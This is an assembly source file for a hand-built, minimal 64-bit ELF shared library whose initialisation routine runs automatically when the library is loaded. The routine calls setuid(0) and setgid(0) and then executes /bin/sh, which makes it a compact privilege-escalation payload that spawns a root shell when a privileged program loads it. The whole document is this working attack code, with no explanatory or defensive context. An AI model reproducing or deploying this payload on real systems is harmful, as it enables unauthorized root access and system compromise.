; nasm -f bin -o tinylib tinylib.asm
BITS 64
	org 0
 
ehdr:				; Elf64_Ehdr
	db 0x7f, "ELF", 2, 1, 1, 0 ; e_ident
	times 8 db 0
	dw  3         ; e_type
	dw  0x3e      ; e_machine
	dd  1         ; e_version
	dq  _start    ; e_entry
	dq  phdr - $$ ; e_phoff
	dq  0         ; e_shoff
	dd  0         ; e_flags
	dw  ehdrsize  ; e_ehsize
	dw  0x38      ; e_phentsize
	dw  2         ; e_phnum
	dw  0         ; e_shentsize
	dw  0         ; e_shnum
	dw  0         ; e_shstrndx
	ehdrsize  equ  $ - ehdr
 
phdr:				; Elf64_Phdr
	; LOAD
	dd  1         ; p_type
	dd  7         ; p_flags  RWE
	dq  0         ; p_offset
	dq  0         ; p_vaddr
	dq  0         ; p_paddr
	dq  filesize  ; p_filesz
	dq  filesize  ; p_memsz
	dq  0x1000    ; p_align
	; DYNAMIC
	dd	2
	dd	7	; RWE
	dq	dynamic
	dq	dynamic
	dq	dynamic
	dq	dynsize
	dq	dynsize
	dq	0x8

dynamic:
	; DT_INIT
	dq	12
	dq	_start
	; DT_STRTAB
	dq	5
	dq	0
	; DT_SYMTAB
	dq	6
	dq	0
	; DT_STRSZ
	dq	0xa
	dq	0
	; DT_SYMENT
	dq	0xb
	dq	0
	; DT_NULL (ending)
	dq	0
	dq	0
dynsize   equ  $ - dynamic

 
_start:
	; setuid(0)
	push 105
	pop  rax
	xor  edi, edi
	syscall
	
	; setgid(0)
	push 106
	pop  rax
	;xor  edi, edi  ; edi is still 0
	syscall
	
	; ececve("/bin/sh", 0, 0)
	xor  esi, esi
	mov  rax, 0x0068732f6e69622f  ; '/bin/sh\0'
	push rax
	push rsp
	pop  rdi
	push 59
	pop  rax
	cdq
	syscall

filesize  equ  $ - $$
